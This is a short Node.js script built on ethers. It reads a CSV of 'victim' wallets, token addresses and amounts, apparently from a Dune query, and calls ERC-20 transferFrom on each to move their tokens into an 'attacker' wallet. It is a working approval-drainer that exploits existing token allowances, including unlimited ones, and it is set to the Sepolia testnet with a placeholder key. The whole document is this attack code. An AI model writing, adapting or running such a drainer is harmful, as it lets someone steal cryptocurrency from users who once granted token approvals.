const { ethers } = require('ethers');
const fs = require('fs');
const csv = require('csv-parser');

// Testnet RPC
const provider = new ethers.JsonRpcProvider('https://rpc.ankr.com/eth_sepolia');

// Burner Key (generate below)
const PRIVATE_KEY = '0xYourBurnerPrivateKeyHere';
const attacker = new ethers.Wallet(PRIVATE_KEY, provider);

const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)',
  'function balanceOf(address) view returns (uint256)'
];

async function drain(victimAddr, tokenAddr, amount) {
  const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, attacker);
  try {
    const dec = await erc20.decimals();
    const balance = await erc20.balanceOf(victimAddr);
    console.log(`Victim ${victimAddr} has ${ethers.formatUnits(balance, dec)} tokens`);

    const tx = await erc20.transferFrom(victimAddr, attacker.address, amount);
    const receipt = await tx.wait();
    console.log(`Drained ${ethers.formatUnits(amount, dec)} from ${victimAddr}`);
    console.log(`Tx: ${receipt.hash}`);
    return receipt.hash;
  } catch (e) {
    console.log(`Failed ${victimAddr}:`, e.message);
  }
}

async function loadVictims(csvPath = 'dune-results.csv') {
  return new Promise((resolve, reject) => {
    const victims = [];
    fs.createReadStream(csvPath)
      .pipe(csv())
      .on('data', (row) => {
        const addr = row.victim_wallet?.trim();
        const token = row.token_address?.trim();
        const rawAmt = row.raw_amount?.trim();
        if (addr && token && rawAmt) {
          victims.push({
            addr,
            token,
            amount: BigInt(rawAmt)  // Handles unlimited
          });
        }
      })
      .on('end', () => resolve(victims))
      .on('error', reject);
  });
}

async function main() {
  const victims = await loadVictims();
  console.log(`Loaded ${victims.length} victims`);
  if (victims.length === 0) {
    console.log('Add test data to CSV!');
    return;
  }
  for (const v of victims) {
    await drain(v.addr, v.token, v.amount);
    await new Promise(r => setTimeout(r, 2000));  // Rate limit
  }
}

main().catch(console.error);
